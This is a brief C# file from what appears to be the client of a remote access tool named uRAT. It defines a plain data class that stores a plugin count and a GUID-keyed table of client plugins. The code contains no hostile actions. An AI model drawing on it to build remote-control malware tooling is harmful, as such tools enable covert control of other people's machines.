using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using uRAT.Client.Plugin;

namespace uRAT.Client.Tools.Blob
{
    internal class PluginBlobMetadata
    {
        public int AvailablePluginCount { get; set; }
        public Dictionary<Guid, BlobClientPlugin> PluginTable { get; set; }

        public PluginBlobMetadata()
        {
            PluginTable = new Dictionary<Guid, BlobClientPlugin>();
        }

        public PluginBlobMetadata(int availablePluginCount, Dictionary<Guid, BlobClientPlugin> pluginTable)
        {
            AvailablePluginCount = availablePluginCount;
            PluginTable = pluginTable;
        }
    }
}
